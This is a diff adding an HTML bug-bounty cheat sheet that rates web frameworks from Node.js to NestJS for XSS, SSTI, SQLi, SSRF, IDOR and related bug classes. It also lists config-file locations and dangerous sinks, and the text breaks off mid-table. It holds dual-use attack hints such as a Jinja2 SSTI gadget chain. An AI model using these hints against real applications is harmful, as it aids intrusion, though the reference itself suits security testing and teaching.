@@ -1,0 +1,1124 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>TBHM — Framework Security Cheat Sheet</title>
+<style>
+  @page { size: landscape; margin: 0.35in; }
+  * { box-sizing: border-box; }
+  body {
+    background: #0e0e0e;
+    color: #e8e8e8;
+    font-family: 'Segoe UI', -apple-system, Arial, sans-serif;
+    font-size: 11px;
+    padding: 24px;
+    margin: 0;
+  }
+  h1 {
+    color: #fff;
+    font-weight: 300;
+    font-size: 22px;
+    margin: 0 0 4px 0;
+    letter-spacing: 0.5px;
+  }
+  .subtitle {
+    color: #888;
+    font-size: 11px;
+    margin-bottom: 18px;
+  }
+  h2 {
+    color: #fff;
+    font-weight: 500;
+    font-size: 15px;
+    margin: 32px 0 10px 0;
+    padding-bottom: 6px;
+    border-bottom: 1px solid #333;
+    letter-spacing: 0.3px;
+  }
+  h2 .tag {
+    font-size: 10px;
+    color: #888;
+    font-weight: 400;
+    margin-left: 10px;
+    text-transform: uppercase;
+    letter-spacing: 0.5px;
+  }
+  table {
+    border-collapse: collapse;
+    width: 100%;
+    table-layout: fixed;
+    page-break-inside: avoid;
+  }
+  th {
+    background: #1f1f1f;
+    color: #fff;
+    font-weight: 600;
+    padding: 9px 6px;
+    border: 1px solid #333;
+    text-align: left;
+    font-size: 9.5px;
+    text-transform: uppercase;
+    letter-spacing: 0.3px;
+  }
+  td {
+    background: #151515;
+    padding: 9px 6px;
+    border: 1px solid #2a2a2a;
+    vertical-align: top;
+    line-height: 1.35;
+  }
+  td.framework {
+    font-weight: 700;
+    color: #fff;
+    background: #1a1a1a;
+    font-size: 12px;
+  }
+  .risk {
+    font-weight: 700;
+    display: block;
+    margin-bottom: 4px;
+    font-size: 11px;
+  }
+  .risk-low { color: #7fd67f; }
+  .risk-mod { color: #f5c26b; }
+  .risk-high { color: #ff6b6b; }
+  .risk-crit { color: #ff3344; }
+  .risk-na { color: #777; }
+  .reason {
+    color: #aaa;
+    font-size: 9.5px;
+    display: block;
+  }
+  .legend {
+    display: flex;
+    gap: 18px;
+    font-size: 10px;
+    color: #aaa;
+    margin: 10px 0 4px 0;
+    padding: 8px 12px;
+    background: #151515;
+    border: 1px solid #2a2a2a;
+    border-radius: 3px;
+  }
+  .legend strong { color: #fff; font-weight: 600; margin-right: 4px; }
+  .toc {
+    background: #151515;
+    border: 1px solid #2a2a2a;
+    padding: 10px 14px;
+    border-radius: 3px;
+    margin: 14px 0 4px 0;
+    font-size: 10.5px;
+    color: #aaa;
+    line-height: 1.7;
+  }
+  .toc strong { color: #fff; font-weight: 600; margin-right: 6px; }
+  .toc a { color: #8cb4ff; text-decoration: none; margin-right: 14px; }
+  .toc a:hover { color: #b5cfff; }
+  .cards {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(400px, 1fr));
+    gap: 12px;
+    margin-top: 12px;
+  }
+  .card {
+    background: #151515;
+    border: 1px solid #2a2a2a;
+    padding: 13px 15px;
+    border-radius: 3px;
+    page-break-inside: avoid;
+  }
+  .card h3 {
+    color: #fff;
+    font-size: 13px;
+    font-weight: 600;
+    margin: 0 0 8px 0;
+    padding-bottom: 6px;
+    border-bottom: 1px solid #333;
+  }
+  .card .label {
+    color: #f5c26b;
+    font-size: 9px;
+    text-transform: uppercase;
+    letter-spacing: 0.5px;
+    margin-top: 9px;
+    margin-bottom: 3px;
+    font-weight: 700;
+    display: block;
+  }
+  .card .value {
+    color: #cfcfcf;
+    font-size: 10px;
+    line-height: 1.5;
+    display: block;
+  }
+  code, .code {
+    font-family: 'Consolas', 'Monaco', 'Courier New', monospace;
+    background: #0a0a0a;
+    color: #f5c26b;
+    padding: 1px 5px;
+    border-radius: 2px;
+    font-size: 10px;
+    border: 1px solid #2a2a2a;
+  }
+  .cve {
+    color: #ff9966;
+    font-family: 'Consolas', 'Monaco', monospace;
+    font-size: 10px;
+    font-weight: 700;
+  }
+  .codeblock {
+    background: #0a0a0a;
+    border: 1px solid #2a2a2a;
+    padding: 12px 14px;
+    border-radius: 3px;
+    color: #d0d0d0;
+    font-family: 'Consolas', 'Monaco', monospace;
+    font-size: 10px;
+    line-height: 1.6;
+    overflow-x: auto;
+    white-space: pre-wrap;
+    word-break: break-all;
+  }
+  .codeblock .comment { color: #666; font-style: italic; }
+  .codeblock .highlight { color: #f5c26b; }
+  .twocol {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 12px;
+  }
+</style>
+</head>
+<body>
+
+<h1>TBHM &mdash; Framework Security Cheat Sheet</h1>
+<div class="subtitle">Config locations, bug-class susceptibility, recon endpoints, fingerprints, and notable CVEs for modern &amp; legacy web frameworks.</div>
+
+<div class="legend">
+  <span><strong style="color:#7fd67f">Low</strong> strong built-in mitigation</span>
+  <span><strong style="color:#f5c26b">Moderate</strong> mitigable but common foot-gun</span>
+  <span><strong style="color:#ff6b6b">High</strong> no built-in protection / frequent root cause</span>
+  <span><strong style="color:#777">N/A</strong> not applicable to this layer</span>
+</div>
+
+<div class="toc">
+<strong>Jump to:</strong>
+<a href="#s1">1. Backend Runtime</a>
+<a href="#s2">2. Client-Side</a>
+<a href="#s3">3. Full-Stack Classic</a>
+<a href="#s4">4. Full-Stack Modern</a>
+<a href="#s5">5. Other &amp; Legacy</a>
+<a href="#s6">6. Recon &amp; Fingerprints</a>
+<a href="#s7">7. Config Leak Hunt List</a>
+<a href="#s8">8. SSTI Polyglot Detection</a>
+<a href="#s9">9. Deserialization Fingerprints</a>
+<a href="#s10">10. Default Dangerous Endpoints</a>
+</div>
+
+<!-- ========================= SECTION 1: BACKEND ========================= -->
+<h2 id="s1">1. Backend Runtime &amp; Minimal Framework <span class="tag">Node.js / Express.js</span></h2>
+<table>
+  <colgroup>
+    <col style="width: 7%"><col style="width: 11%"><col style="width: 9%"><col style="width: 8%"><col style="width: 8%"><col style="width: 10%"><col style="width: 8%"><col style="width: 8%"><col style="width: 8%"><col style="width: 7%"><col style="width: 7%"><col style="width: 4%"><col style="width: 5%">
+  </colgroup>
+<thead>
+<tr>
+  <th>Framework / Env</th>
+  <th>Config File &amp; Location</th>
+  <th>XSS</th>
+  <th>LFI</th>
+  <th>SSTI</th>
+  <th>CSRF</th>
+  <th>SQLi</th>
+  <th>Param Pollution</th>
+  <th>SSRF</th>
+  <th>IDOR</th>
+  <th>MFLAC</th>
+  <th>Lazy Load</th>
+  <th>Main File</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+  <td class="framework">Node.js</td>
+  <td><span class="reason">.env at project root; configurations often in config/ directory.</span></td>
+  <td><span class="risk risk-mod">Moderate</span><span class="reason">Apps that emit HTML via template engines (EJS/Pug/Handlebars) or direct res.send are XSS-vulnerable when user input isn't sanitized.</span></td>
+  <td><span class="risk risk-high">High</span><span class="reason">Direct fs access via readFile/createReadStream can lead to LFI without input sanitization.</span></td>
+  <td><span class="risk risk-high">High</span><span class="reason">Dynamic template rendering vulnerable if user input isn't sanitized.</span></td>
+  <td><span class="risk risk-mod">Moderate</span><span class="reason">No built-in CSRF. Mitigated somewhat by browser SameSite=Lax defaults (Chrome 80+); explicit tokens / SameSite=Strict still required for sensitive actions.</span></td>
+  <td><span class="risk risk-mod">Moderate</span><span class="reason">Use parameterized queries and ORMs (Prisma, Sequelize, Knex).</span></td>
+  <td><span class="risk risk-mod">Moderate</span><span class="reason">Proper validation and sanitization of parameters required.</span></td>
+  <td><span class="risk risk-mod">Moderate</span><span class="reason">Validate URLs and limit external requests.</span></td>
+  <td><span class="risk risk-high">High</span><span class="reason">Manual checks required for all object access.</span></td>
+  <td><span class="risk risk-high">High</span><span class="reason">Explicit access control checks required for every route.</span></td>
+  <td><span class="reason">Conditional</span></td>
+  <td><span class="reason">index.js or server.js</span></td>
+</tr>
+<tr>
+  <td class="framework">Express.js</td>
+  <td><span class="reason">.env for environment variables; config in config/ or directly within app.js.</span></td>
+  <td><span class="risk risk-mod">Moderate</span><span class="reason">Commonly renders HTML via view engines (EJS, Pug, Handlebars); unsanitized user input in templates leads to XSS.</span></td>
+  <td><span class="risk risk-mod">Moderate</span><span class="reason">Mitigated by sanitizing file path inputs; path.join + allowlist.</span></td>
+  <td><span class="risk risk-high">High</span><span class="reason">Vulnerable if template engines process unsanitized user input (Handlebars/EJS SSTI).</span></td>
+  <td><span class="risk risk-mod">Moderate</span><span class="reason">Requires CSRF middleware. csurf is deprecated (unmaintained, known issues) &mdash; use csrf-sync, csrf-csrf, or custom double-submit cookie.</span></td>
+  <td><span class="risk risk-mod">Moderate</span><span class="reason">Mitigated through safe query practices and ORMs.</span></td>
+  <td><span class="risk risk-mod">Moderate</span><span class="reason">Express parses duplicate query params into arrays by default &mdash; type confusion sink.</span></td>
+  <td><span class="risk risk-mod">Moderate</span><span class="reason">Validate URLs and user inputs for external requests.</span></td>
+  <td><span class="risk risk-high">High</span><span class="reason">Requires explicit security measures for route/object access.</span></td>
+  <td><span class="risk risk-high">High</span><span class="reason">Access control logic must be explicitly implemented per route.</span></td>
+  <td><span class="reason">Conditional</span></td>
+  <td><span class="reason">app.js or index.js</span></td>
+</tr>
+</tbody>
+</table>
+
+<!-- ========================= SECTION 2: FRONTEND ========================= -->
+<h2 id="s2">2. Client-Side Frameworks <span class="tag">React / jQuery / Angular / Vue</span></h2>
+<table>
+  <colgroup>
+    <col style="width: 7%"><col style="width: 11%"><col style="width: 11%"><col style="width: 7%"><col style="width: 7%"><col style="width: 8%"><col style="width: 7%"><col style="width: 7%"><col style="width: 7%"><col style="width: 7%"><col style="width: 7%"><col style="width: 4%"><col style="width: 10%">
+  </colgroup>
+<thead>
+<tr>
+  <th>Framework</th>
+  <th>Config File &amp; Location</th>
+  <th>XSS</th>
+  <th>LFI</th>
+  <th>SSTI</th>
+  <th>CSRF</th>
+  <th>SQLi</th>
+  <th>Param Pollution</th>
+  <th>SSRF</th>
+  <th>IDOR</th>
+  <th>MFLAC</th>
+  <th>Lazy Load</th>
+  <th>Main File</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+  <td class="framework">React</td>
+  <td><span class="reason">Modern: vite.config.js and .env in project root (Vite is current standard since CRA was deprecated Feb 2025). Legacy: .env in CRA root.</span></td>
+  <td><span class="risk risk-low">Low</span><span class="reason">JSX escapes values by default. Misuse of dangerouslySetInnerHTML can introduce XSS. Using innerHTML via refs with user-controlled input bypasses React's sanitization. javascript: URLs in href/src attributes.</span></td>
+  <td><span class="risk risk-na">N/A</span><span class="reason">React does not interact with the file system directly.</span></td>
+  <td><span class="risk risk-na">N/A</span><span class="reason">Client-side rendering model mitigates SSTI risks.</span></td>
+  <td><span class="risk risk-na">N/A</span><span class="reason">CSRF protection is a back-end concern.</span></td>
+  <td><span class="risk risk-na">N/A</span><span class="reason">React does not directly interact with databases.</span></td>
+  <td><span class="risk risk-na">N/A</span><span class="reason">Does not handle URL parameters at the back-end level.</span></td>
+  <td><span class="risk risk-na">N/A</span><span class="reason">Builds client-side UIs, not involved in server-side requests.</span></td>
+  <td><span class="risk risk-na">N/A</span><span class="reason">IDOR management is a server-side responsibility.</span></td>
+  <td><span class="risk risk-na">N/A</span><span class="reason">Function-level access control is managed server-side.</span></td>
+  <td><span class="reason">Yes</span></td>
+  <td><span class="reason">index.js, App.js (main.jsx for Vite)</span></td>
+</tr>
+<tr>
+  <td class="framework">jQuery</td>
+  <td><span class="reason">N/A &mdash; library without a standard project structure.</span></td>
+  <td><span class="risk risk-mod">Moderate</span><span class="reason">Sinks: .html(), .append(), .prepend(), .before(), .after(), $() selector with user input (pre-3.5). Parse vulnerabilities in &lt;3.0.</span></td>
+  <td><span class="risk risk-na">N/A</span><span class="reason">Client-side library; no file ops.</span></td>
+  <td><span class="risk risk-na">N/A</span><span class="reason">Not involved in server-side templating.</span></td>
+  <td><span class="risk risk-na">N/A</span><span class="reason">CSRF defenses implemented server-side.</span></td>
+  <td><span class="risk risk-na">N/A</span><span class="reason">Does not interact with the database directly.</span></td>
+  <td><span class="risk risk-na">N/A</span><span class="reason">Managed by the server.</span></td>
+  <td><span class="risk risk-na">N/A</span><span class="reason">Does not initiate server-side requests.</span></td>
+  <td><span class="risk risk-na">N/A</span><span class="reason">Does not handle server-side object references.</span></td>
+  <td><span class="risk risk-na">N/A</span><span class="reason">Does not control server-side access.</span></td>
+  <td><span class="reason">N/A</span></td>
+  <td><span class="reason">N/A (library, not framework)</span></td>
+</tr>
+<tr>
+  <td class="framework">Angular</td>
+  <td><span class="reason">Environment files in environments/ directory (optional since Angular 15+, still supported).</span></td>
+  <td><span class="risk risk-low">Low</span><span class="reason">Angular's sanitizer helps prevent XSS; devs should avoid bypassing via bypassSecurityTrustHtml / bypassSecurityTrustUrl / bypassSecurityTrustScript.</span></td>
+  <td><span class="risk risk-na">N/A</span><span class="reason">Client-side, no file system access.</span></td>
+  <td><span class="risk risk-na">N/A</span><span class="reason">Client-side data binding avoids SSTI.</span></td>
+  <td><span class="risk risk-low">Low</span><span class="reason">HttpClientXsrfModule reads XSRF-TOKEN cookie and sends X-XSRF-TOKEN header. Only protects if backend issues the cookie and validates the header &mdash; cannot defend a vulnerable backend alone.</span></td>
+  <td><span class="risk risk-na">N/A</span><span class="reason">Does not directly execute database queries.</span></td>
+  <td><span class="risk risk-na">N/A</span><span class="reason">Focused on client-side rendering.</span></td>
+  <td><span class="risk risk-na">N/A</span><span class="reason">No server-side requests.</span></td>
+  <td><span class="risk risk-na">N/A</span><span class="reason">IDOR is a server-side concern.</span></td>
+  <td><span class="risk risk-na">N/A</span><span class="reason">Not responsible for server-side access controls.</span></td>
+  <td><span class="reason">Yes</span></td>
+  <td><span class="reason">main.ts</span></td>
+</tr>
+<tr>
+  <td class="framework">Vue.js</td>
+  <td><span class="reason">.env files in the project root (Vue CLI or Vite projects).</span></td>
+  <td><span class="risk risk-low">Low</span><span class="reason">Vue automatically escapes output; use caution with v-html, v-bind:href with user URLs, and compiled templates.</span></td>
+  <td><span class="risk risk-na">N/A</span><span class="reason">Client-side; no file operations.</span></td>
+  <td><span class="risk risk-na">N/A</span><span class="reason">Client-side rendering negates SSTI risk.</span></td>
+  <td><span class="risk risk-na">N/A</span><span class="reason">Back-end concern; Vue provides no CSRF protection.</span></td>
+  <td><span class="risk risk-na">N/A</span><span class="reason">No direct database interactions.</span></td>
+  <td><span class="risk risk-na">N/A</span><span class="reason">Server handles param pollution.</span></td>
+  <td><span class="risk risk-na">N/A</span><span class="reason">Client-side only.</span></td>
+  <td><span class="risk risk-na">N/A</span><span class="reason">Backend responsibility.</span></td>
+  <td><span class="risk risk-na">N/A</span><span class="reason">Beyond Vue.js's scope.</span></td>
+  <td><span class="reason">Yes</span></td>
+  <td><span class="reason">main.js or main.ts</span></td>
+</tr>
+</tbody>
+</table>
+
+<!-- ========================= SECTION 3: FULL-STACK CLASSIC ========================= -->
+<h2 id="s3">3. Full-Stack Frameworks &mdash; Classic <span class="tag">ASP.NET Core / Django / Flask / Next.js / Laravel</span></h2>
+<table>
+  <colgroup>
+    <col style="width: 7%"><col style="width: 10%"><col style="width: 8%"><col style="width: 8%"><col style="width: 9%"><col style="width: 8%"><col style="width: 8%"><col style="width: 8%"><col style="width: 8%"><col style="width: 7%"><col style="width: 7%"><col style="width: 4%"><col style="width: 8%">
+  </colgroup>
+<thead>
+<tr>
+  <th>Framework</th>
+  <th>Config File &amp; Location</th>
+  <th>XSS</th>
+  <th>LFI</th>
+  <th>SSTI</th>
+  <th>CSRF</th>
+  <th>SQLi</th>
+  <th>Param Pollution</th>
+  <th>SSRF</th>
+  <th>IDOR</th>
+  <th>MFLAC</th>
+  <th>Lazy Load</th>
+  <th>Main File</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+  <td class="framework">ASP.NET Core</td>
+  <td><span class="reason">appsettings.json + appsettings.{Environment}.json, launchSettings.json, typically in project root.</span></td>
+  <td><span class="risk risk-low">Low</span><span class="reason">Razor auto-encodes output; HtmlHelper and TagHelper encode by default.</span></td>
+  <td><span class="risk risk-mod">Moderate</span><span class="reason">PhysicalFileProvider and direct File.* calls with user input are sinks.</span></td>
+  <td><span class="risk risk-low">Low</span><span class="reason">Razor views are precompiled at build time &mdash; classic runtime SSTI is effectively non-existent unless devs explicitly use runtime compilation (e.g., RazorLight) on user input.</span></td>
+  <td><span class="risk risk-mod">Moderate</span><span class="reason">Anti-forgery tokens via [ValidateAntiForgeryToken] or automatic in Razor forms.</span></td>
+  <td><span class="risk risk-mod">Moderate</span><span class="reason">Entity Framework uses parameterized queries; FromSqlRaw / ExecuteSqlRaw with string concat are sinks.</span></td>
+  <td><span class="risk risk-mod">Moderate</span><span class="reason">Model binding helps prevent pollution, but attention to validation required.</span></td>
+  <td><span class="risk risk-mod">Moderate</span><span class="reason">HttpClient with user URLs requires validation.</span></td>
+  <td><span class="risk risk-mod">Moderate</span><span class="reason">Identity and [Authorize] policies help but must be applied consistently.</span></td>
+  <td><span class="risk risk-mod">Moderate</span><span class="reason">Detailed access control via [Authorize(Policy="")], Role-based, resource-based authorization.</span></td>
+  <td><span class="reason">Yes</span></td>
+  <td><span class="reason">Program.cs (.NET 6+ minimal hosting). Legacy: Startup.cs.</span></td>
+</tr>
+<tr>
+  <td class="framework">Django</td>
+  <td><span class="reason">settings.py in project's main app directory; .env via python-dotenv or django-environ.</span></td>
+  <td><span class="risk risk-low">Low</span><span class="reason">Auto-escapes templates; bypasses: {% autoescape off %}, mark_safe(), |safe filter, SafeString.</span></td>
+  <td><span class="risk risk-mod">Moderate</span><span class="reason">send_file, static file serving in DEBUG, user-controlled file paths.</span></td>
+  <td><span class="risk risk-low">Low</span><span class="reason">Django template engine is restricted (no arbitrary Python); Jinja2 integration is where SSTI usually appears.</span></td>
+  <td><span class="risk risk-low">Low</span><span class="reason">CsrfViewMiddleware enabled by default; @csrf_exempt removes protection.</span></td>
+  <td><span class="risk risk-low">Low</span><span class="reason">ORM parameterizes by default; raw(), extra(), RawSQL, .annotate(RawSQL()) are sinks.</span></td>
+  <td><span class="risk risk-mod">Moderate</span><span class="reason">QueryDict parses duplicates; getlist() returns all values.</span></td>
+  <td><span class="risk risk-mod">Moderate</span><span class="reason">requests, urllib with user URLs; validate all external fetches.</span></td>
+  <td><span class="risk risk-mod">Moderate</span><span class="reason">Permission system exists but object-level permissions need django-guardian or manual.</span></td>
+  <td><span class="risk risk-mod">Moderate</span><span class="reason">Decorators @login_required, @permission_required, DRF permission_classes; easy to forget on individual views.</span></td>
+  <td><span class="reason">Yes</span></td>
+  <td><span class="reason">manage.py (CLI), wsgi.py / asgi.py (deployment); urls.py for routing.</span></td>
+</tr>
+<tr>
+  <td class="framework">Flask</td>
+  <td><span class="reason">config.py or directly in app.py; sensitive data in .env files.</span></td>
+  <td><span class="risk risk-mod">Moderate</span><span class="reason">Jinja2 auto-escapes only .html/.htm/.xml/.xhtml by default. XSS viable via |safe, Markup(), render_template_string() with user input, raw strings, or non-HTML template extensions.</span></td>
+  <td><span class="risk risk-mod">Moderate</span><span class="reason">Devs must manually sanitize file path inputs; send_from_directory with user input is the typical sink.</span></td>
+  <td><span class="risk risk-high">High</span><span class="reason">Jinja2 auto-escapes HTML, but SSTI via render_template_string() on user input is a well-known RCE primitive (classic {{ config.__class__.__init__.__globals__ }} chain).</span></td>
+  <td><span class="risk risk-mod">Moderate</span><span class="reason">CSRF protection requires Flask-WTF extension.</span></td>
+  <td><span class="risk risk-mod">Moderate</span><span class="reason">SQLi prevention depends on using SQLAlchemy/ORM correctly; raw text() with string concat is sink.</span></td>
+  <td><span class="risk risk-mod">Moderate</span><span class="reason">request.args.getlist() for multi-value; careful with type coercion.</span></td>
+  <td><span class="risk risk-mod">Moderate</span><span class="reason">Validate external URLs; requests library common sink.</span></td>
+  <td><span class="risk risk-high">High</span><span class="reason">No built-in IDOR protection; requires manual implementation.</span></td>
+  <td><span class="risk risk-high">High</span><span class="reason">Function-level access control must be explicitly coded (Flask-Login + custom decorators).</span></td>
+  <td><span class="reason">Conditional</span></td>
+  <td><span class="reason">app.py (or run.py, wsgi.py)</span></td>
+</tr>
+<tr>
+  <td class="framework">Next.js</td>
+  <td><span class="reason">.env for environment variables and next.config.js / next.config.ts for Next.js-specific config.</span></td>
+  <td><span class="risk risk-low">Low</span><span class="reason">Inherits React's XSS protections; SSR and dangerouslySetInnerHTML still require careful handling.</span></td>
+  <td><span class="risk risk-mod">Moderate</span><span class="reason">API routes run server-side with full fs access. Real path-traversal CVEs shipped (e.g., CVE-2020-5284). User-controlled file paths need validation.</span></td>
+  <td><span class="risk risk-na">N/A</span><span class="reason">React auto-escapes content, mitigating SSTI risks.</span></td>
+  <td><span class="risk risk-mod">Moderate</span><span class="reason">Plain API routes have no built-in CSRF; devs must implement tokens or use NextAuth.js. Server Actions (13.4+) include built-in CSRF-like protection.</span></td>
+  <td><span class="risk risk-mod">Moderate</span><span class="reason">API routes frequently connect to DBs (Prisma, raw Postgres). DB interaction is not abstracted.</span></td>
+  <td><span class="risk risk-mod">Moderate</span><span class="reason">API routes parse query parameters; pollution risk present.</span></td>
+  <td><span class="risk risk-mod">Moderate</span><span class="reason">getServerSideProps, Server Components, and API routes routinely make server-side fetch requests &mdash; prime SSRF surface.</span></td>
+  <td><span class="risk risk-mod">Moderate</span><span class="reason">Requires explicit security checks in API routes and server-side functions.</span></td>
+  <td><span class="risk risk-mod">Moderate</span><span class="reason">Access control must be enforced in API routes and server-side functions.</span></td>
+  <td><span class="reason">Yes</span></td>
+  <td><span class="reason">App Router (13+): app/layout.js, app/page.js, app/api/*/route.js. Legacy Pages: pages/_app.js, pages/api/*.</span></td>
+</tr>
+<tr>
+  <td class="framework">Laravel</td>
+  <td><span class="reason">.env file and config/ directory for configuration files, at the project root.</span></td>
+  <td><span class="risk risk-low">Low</span><span class="reason">Blade escapes output by default; {!! !!} raw expressions are the sink.</span></td>
+  <td><span class="risk risk-mod">Moderate</span><span class="reason">Storage and File facades provide safe ops; user-supplied paths still need validation.</span></td>
+  <td><span class="risk risk-low">Low</span><span class="reason">Blade's restricted syntax reduces SSTI risks.</span></td>
+  <td><span class="risk risk-low">Low</span><span class="reason">VerifyCsrfToken middleware enabled by default for web routes.</span></td>
+  <td><span class="risk risk-low">Low</span><span class="reason">Eloquent uses parameterized queries; DB::raw() and whereRaw() with user input are sinks.</span></td>
+  <td><span class="risk risk-mod">Moderate</span><span class="reason">Devs must validate and sanitize all input to prevent pollution.</span></td>
+  <td><span class="risk risk-mod">Moderate</span><span class="reason">Http facade (Guzzle) with user URLs requires validation.</span></td>
+  <td><span class="risk risk-mod">Moderate</span><span class="reason">Policy and gate system helps manage access, but must be correctly implemented.</span></td>
+  <td><span class="risk risk-mod">Moderate</span><span class="reason">Requires explicit definition of policies for secure access control.</span></td>
+  <td><span class="reason">Yes</span></td>
+  <td><span class="reason">public/index.php (entry); routes in routes/web.php, routes/api.php.</span></td>
+</tr>
+</tbody>
+</table>
+
+<!-- ========================= SECTION 4: FULL-STACK MODERN ========================= -->
+<h2 id="s4">4. Full-Stack Frameworks &mdash; Modern <span class="tag">Rails / Spring Boot / FastAPI / NestJS / Nuxt</span></h2>
+<table>
+  <colgroup>
+    <col style="width: 7%"><col style="width: 10%"><col style="width: 8%"><col style="width: 8%"><col style="width: 9%"><col style="width: 8%"><col style="width: 8%"><col style="width: 8%"><col style="width: 8%"><col style="width: 7%"><col style="width: 7%"><col style="width: 4%"><col style="width: 8%">
+  </colgroup>
+<thead>
+<tr>
+  <th>Framework</th>
+  <th>Config File &amp; Location</th>
+  <th>XSS</th>
+  <th>LFI</th>
+  <th>SSTI</th>
+  <th>CSRF</th>
+  <th>SQLi</th>
+  <th>Param Pollution</th>
+  <th>SSRF</th>
+  <th>IDOR</th>
+  <th>MFLAC</th>
+  <th>Lazy Load</th>
+  <th>Main File</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+  <td class="framework">Ruby on Rails</td>
+  <td><span class="reason">config/database.yml, config/secrets.yml, config/credentials.yml.enc + config/master.key (leak = full app decrypt). Gemfile, config/routes.rb.</span></td>
+  <td><span class="risk risk-low">Low</span><span class="reason">ERB auto-escapes &lt;%= %&gt;. Sinks: raw, html_safe, &lt;%== %&gt;, sanitize with allowlist bypass, content_tag with user input.</span></td>
+  <td><span class="risk risk-mod">Moderate</span><span class="reason">send_file / send_data with user-controlled paths; render file: sink.</span></td>
+  <td><span class="risk risk-mod">Moderate</span><span class="reason">ERB.new(user_input).result is the classic sink; render inline: with user input.</span></td>
+  <td><span class="risk risk-low">Low</span><span class="reason">protect_from_forgery with: :exception enabled by default in ApplicationController.</span></td>
+  <td><span class="risk risk-mod">Moderate</span><span class="reason">ActiveRecord parameterizes by default. Sinks: .where("name = '#{x}'"), .order(user_input), .find_by_sql, .pluck with raw SQL.</span></td>
+  <td><span class="risk risk-mod">Moderate</span><span class="reason">Rails parses query strings into nested hashes; type confusion between String/Array/Hash.</span></td>
+  <td><span class="risk risk-mod">Moderate</span><span class="reason">open-uri, Net::HTTP, HTTParty with user URLs. open() is especially dangerous (file:// + | for pipe).</span></td>
+  <td><span class="risk risk-high">High</span><span class="reason">Manual authorization required unless using Pundit/CanCanCan. params[:id] + Model.find is the classic IDOR pattern.</span></td>
+  <td><span class="risk risk-high">High</span><span class="reason">before_action :authenticate_user! must be explicit per controller; individual actions can miss it.</span></td>
+  <td><span class="reason">Yes</span></td>
+  <td><span class="reason">config/application.rb, config/routes.rb, config.ru</span></td>
+</tr>
+<tr>
+  <td class="framework">Spring Boot</td>
+  <td><span class="reason">application.properties, application.yml, application-{profile}.yml, bootstrap.yml. logback-spring.xml for logging.</span></td>
+  <td><span class="risk risk-mod">Moderate</span><span class="reason">Thymeleaf auto-escapes by default; JSP does not. th:utext is the raw sink. HTML-escaped by default in Mustache and FreeMarker.</span></td>
+  <td><span class="risk risk-mod">Moderate</span><span class="reason">ResourceLoader, ClassPathResource, Files.read* with user paths; static resource handlers with path traversal.</span></td>
+  <td><span class="risk risk-high">High</span><span class="reason">SpEL injection via @Value or runtime evaluation (CVE-2022-22965 Spring4Shell). Thymeleaf expression injection via unescaped output. FreeMarker SSTI if exposed.</span></td>
+  <td><span class="risk risk-low">Low</span><span class="reason">Spring Security CSRF enabled by default for non-GET requests (when Spring Security is present).</span></td>
+  <td><span class="risk risk-mod">Moderate</span><span class="reason">JPA/Hibernate parameterizes; @Query with string concat, Criteria API with raw literals, JdbcTemplate with string concat are sinks.</span></td>
+  <td><span class="risk risk-mod">Moderate</span><span class="reason">@RequestParam with List&lt;String&gt; or arrays; MultiValueMap parsing.</span></td>
+  <td><span class="risk risk-mod">Moderate</span><span class="reason">RestTemplate, WebClient, OkHttp with user URLs. Look for URL() constructor sinks.</span></td>
+  <td><span class="risk risk-mod">Moderate</span><span class="reason">Spring Security method-level, @PreAuthorize, but easy to miss on individual endpoints.</span></td>
+  <td><span class="risk risk-mod">Moderate</span><span class="reason">@PreAuthorize, @Secured, @RolesAllowed; missing from individual methods = bypass.</span></td>
+  <td><span class="reason">Yes</span></td>
+  <td><span class="reason">{App}Application.java with @SpringBootApplication + main() calling SpringApplication.run().</span></td>
+</tr>
+<tr>
+  <td class="framework">FastAPI</td>
+  <td><span class="reason">.env + pydantic Settings (often in app/core/config.py). main.py or app/main.py. pyproject.toml / requirements.txt.</span></td>
+  <td><span class="risk risk-mod">Moderate</span><span class="reason">No built-in templating; if Jinja2 is used via fastapi.templating, inherits Flask XSS risks. HTMLResponse with string concat is sink.</span></td>
+  <td><span class="risk risk-mod">Moderate</span><span class="reason">FileResponse with user-controlled paths; StaticFiles mount with traversal.</span></td>
+  <td><span class="risk risk-mod">Moderate</span><span class="reason">Only applicable if Jinja2 templates are used with user input in render_template_string-like patterns.</span></td>
+  <td><span class="risk risk-high">High</span><span class="reason">No built-in CSRF; needs fastapi-csrf-protect or custom implementation. Assumed stateless JSON API but cookie auth still needs CSRF.</span></td>
+  <td><span class="risk risk-mod">Moderate</span><span class="reason">SQLAlchemy async, asyncpg, aiomysql; raw text() with string concat is sink.</span></td>
+  <td><span class="risk risk-low">Low</span><span class="reason">Pydantic validation is strict by default; type coercion prevents most pollution.</span></td>
+  <td><span class="risk risk-mod">Moderate</span><span class="reason">httpx.AsyncClient, aiohttp with user URLs; webhook features common sink.</span></td>
+  <td><span class="risk risk-high">High</span><span class="reason">Manual auth implementation; Depends() for auth dependency. Easy to forget on individual routes.</span></td>
+  <td><span class="risk risk-high">High</span><span class="reason">Explicit Depends(require_admin) per-route; no global default.</span></td>
+  <td><span class="reason">Yes</span></td>
+  <td><span class="reason">main.py with app = FastAPI(), started via uvicorn main:app.</span></td>
+</tr>
+<tr>
+  <td class="framework">NestJS</td>
+  <td><span class="reason">@nestjs/config + .env, nest-cli.json, tsconfig.json, main.ts bootstraps AppModule via NestFactory.create().</span></td>
+  <td><span class="risk risk-mod">Moderate</span><span class="reason">Runs on Express (default) or Fastify; inherits underlying templating XSS risks.</span></td>
+  <td><span class="risk risk-mod">Moderate</span><span class="reason">ServeStaticModule misconfig; file operations in controllers with user input.</span></td>
+  <td><span class="risk risk-mod">Moderate</span><span class="reason">Template engine dependent; same risks as underlying Express/Fastify.</span></td>
+  <td><span class="risk risk-mod">Moderate</span><span class="reason">Inherits Express CSRF situation (csurf deprecated). Apply csrf-csrf or custom middleware.</span></td>
+  <td><span class="risk risk-mod">Moderate</span><span class="reason">TypeORM, Prisma, Mongoose: raw queries, query builders with string concat are sinks.</span></td>
+  <td><span class="risk risk-mod">Moderate</span><span class="reason">Default Express query parsing; DTO validation via ValidationPipe mitigates.</span></td>
+  <td><span class="risk risk-mod">Moderate</span><span class="reason">HttpModule, fetch, axios with user URLs; webhook-heavy apps are typical sink.</span></td>
